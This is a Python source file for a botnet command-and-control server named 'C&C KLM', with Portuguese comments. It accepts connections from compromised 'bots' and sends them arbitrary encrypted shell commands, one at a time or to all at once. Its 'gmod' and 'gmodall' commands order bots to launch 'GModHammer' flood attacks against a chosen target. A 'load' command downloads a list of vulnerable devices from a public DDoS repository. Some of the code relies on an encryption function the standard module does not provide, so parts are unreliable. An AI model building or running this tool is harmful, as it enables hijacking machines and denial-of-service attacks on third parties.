import socket
import crypt
from time import sleep
import threading
import uuid
import traceback
import urllib.request
RESET = "\033[0m"
VERDE = "\033[32m"
botsList = {}
IP  = "0.0.0.0"
PORT = 8080
def start():
    try:
        sv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sv.bind((IP, PORT))
        sv.listen(1)    
        print(f"Active server on port {PORT}")
        return sv
    except Exception as e:
        print(f"Error starting server: {e}")
def send_cmd(conn, msg):
    """Envia um comando para o cliente."""
    try:
        # Criptografa a mensagem antes de enviar (assumindo que crypt.encrypt_message existe)
        encrypted_msg = crypt.encrypt_message(msg)
        conn.sendall(encrypted_msg + b'\n')
    except (BrokenPipeError, socket.error) as e:
        print(f"\n[!] Failed to send command: Bot disconnected ({e})")
    except Exception as e:
        print(f"Error sending data: {e}")

def handle_client(conn, addr):
    """Thread que gerencia a comunicação com um cliente específico."""
    client_id = str(uuid.uuid4())[:8]
    botsList[client_id] = conn
    print(f"\n{VERDE}[+] New bot connected: {addr} (ID: {client_id}){RESET}")
    
    try:
        # Handshake inicial
        conn.send("connected".encode("utf-8"))
        
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                    
                try:
                    decrypted_data = crypt.decrypt_message(data)
                except Exception:
                    # Se a descriptografia falhar, tenta tratar como texto plano
                    try:
                        decrypted_data = data.decode('utf-8').strip()
                    except:
                        decrypted_data = f"[Raw Data]: {data}"
                
                print(f"\n{VERDE}[Bot {client_id}]: {decrypted_data}{RESET}")
                print("c2> ", end="", flush=True)
            except (ConnectionResetError, socket.error):
                break
    except Exception as e:
        print(f"\n[!] Critical error with bot {client_id}:")
        traceback.print_exc()
    finally:
        print(f"\n[!] Bot {client_id} disconnected")
        del botsList[client_id]
        conn.close()

def load_bots_from_url(url):
    """Baixa uma lista de bots de uma URL externa."""
    try:
        print(f"  [>] Downloading bot list from {url}...")
        with urllib.request.urlopen(url) as response:
            content = response.read().decode('utf-8')
            bots = [line.strip() for line in content.splitlines() if line.strip()]
            print(f"  [+] Loaded {len(bots)} bots from list.")
            return bots
    except Exception as e:
        print(f"  [!] Error loading bot list: {e}")
        return []

def commands_loop():
    """Loop principal para o operador digitar comandos."""
    try:
        while True:
            msg = input("c2> ")
            if not msg.strip():
                continue
                
            parts = msg.split(maxsplit=1)
            cmd_name = parts[0]
            
            if cmd_name == "help":
                print("""
Available commands:
  list             - List all connected bots
  use <id>         - Select a bot to control
  cmd <command>    - Send command to the selected bot
  spray <command>  - Send command to ALL connected bots
  gmod <target> <port> <mode> - Run GModHammer on a bot
  gmodall <target> <port> <mode> - Run GModHammer on ALL bots
  load             - Load bot list from RootSec URL
  help             - Show this help message
                """)
            elif cmd_name == "list":
                print("\nConnected Bots:")
                for bid in botsList:
                    print(f" - {bid}")
            elif cmd_name == "load":
                url = "https://raw.githubusercontent.com/R00tS3c/DDOS-RootSec/refs/heads/master/Botnets/Vuln%20lists%20(Mirai%20loader)/50KR00TS3C.txt"
                external_bots = load_bots_from_url(url)
                if external_bots:
                    print(f"  [!] Note: {len(external_bots)} external bots loaded to memory.")
                    # Aqui você poderia adicionar lógica para tentar conectar neles
                    # mas como são bots vulneráveis externos, geralmente eles conectam no servidor
                else:
                    print("  [X] No bots found in the list.")
            elif cmd_name == "use":
                # Lógica de seleção simplificada para este exemplo
                if len(parts) > 1:
                    global selected_bot
                    selected_bot = parts[1]
                    if selected_bot in botsList:
                        print(f"Using bot {selected_bot}")
                    else:
                        print("Bot ID not found")
                else:
                    print("Usage: use <id>")
            elif cmd_name == "cmd":
                if 'selected_bot' in globals() and selected_bot in botsList:
                    if len(parts) > 1:
                        send_cmd(botsList[selected_bot], parts[1])
                    else:
                        print("Usage: cmd <command>")
                else:
                    print("No bot selected. Use 'use <id>' first.")
            elif cmd_name == "spray":
                if len(parts) > 1:
                    command_to_spray = parts[1]
                    print(f"Spraying command to {len(botsList)} bots...")
                    for bot_id, conn in botsList.items():
                        send_cmd(conn, command_to_spray)
                else:
                    print("Usage: spray <command>")
            elif cmd_name == "gmod":
                # Formato: gmod <target> <port> <mode>
                # Ex: gmod 1.2.3.4 27015 udp-flood
                if len(parts) > 1:
                    args = parts[1].split()
                    if len(args) >= 3:
                        target, port, mode = args[0], args[1], args[2]
                        # Monta o comando para o bot executar o gmodhammer.py
                        # Assume-se que gmodhammer.py está no mesmo diretório do bot
                        gmod_cmd = f"python gmodhammer.py --target {target} --port {port} --mode {mode} --threads 10"
                        
                        if 'selected_bot' in globals() and selected_bot in botsList:
                            send_cmd(botsList[selected_bot], gmod_cmd)
                            print(f"Launched GModHammer on bot {selected_bot}")
                        else:
                            print("No bot selected. Use 'use <id>' first.")
                    else:
                        print("Usage: gmod <target> <port> <mode>")
                else:
                    print("Usage: gmod <target> <port> <mode>")
            elif cmd_name == "gmodall":
                # Formato: gmodall <target> <port> <mode>
                if len(parts) > 1:
                    args = parts[1].split()
                    if len(args) >= 3:
                        target, port, mode = args[0], args[1], args[2]
                        gmod_cmd = f"python gmodhammer.py --target {target} --port {port} --mode {mode} --threads 10"
                        
                        print(f"Launching GModHammer on ALL {len(botsList)} bots...")
                        for bot_id, conn in botsList.items():
                            send_cmd(conn, gmod_cmd)
                    else:
                        print("Usage: gmodall <target> <port> <mode>")
                else:
                    print("Usage: gmodall <target> <port> <mode>")
            else:
                print(f"Unknown command: {cmd_name}. Type 'help' for list.")
    except Exception as e:
        print(f"Error in commands loop: {e}")

if __name__ == "__main__":
    # Código Python para imprimir a arte ASCII "C&C KLM"
    art = """
    /$$$$$$   /$$$      /$$$$$$        /$$   /$$ /$$       /$$      /$$
    /$$__  $$ /$$ $$    /$$__  $$      | $$  /$$/| $$      | $$$    /$$$
    | $$  \__/|  $$$    | $$  \__/      | $$ /$$/ | $$      | $$$$  /$$$$
    | $$       /$$ $$/$$| $$            | $$$$$/  | $$      | $$ $$/$$ $$
    | $$      | $$  $$_/| $$            | $$  $$  | $$      | $$  $$$| $$
    | $$    $$| $$\  $$ | $$    $$      | $$\  $$ | $$      | $$\  $ | $$
    |  $$$$$$/|  $$$$/$$|  $$$$$$/      | $$ \  $$| $$$$$$$$| $$ \/  | $$
    \______/  \____/\_/ \______/       |__/  \__/|________/|__/     |__/
                                                                
    """

    print(art)

    try:
        server = start()
        # Inicia a thread de comandos para o operador
        threading.Thread(target=commands_loop, daemon=True).start()
        
        while True:
            conn, addr = server.accept()
            # Inicia uma thread para cada cliente conectado
            client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            client_thread.start()

    except KeyboardInterrupt:
        print("Server stopped.")
    except Exception as e:
        print(f"An error occurred: {e}")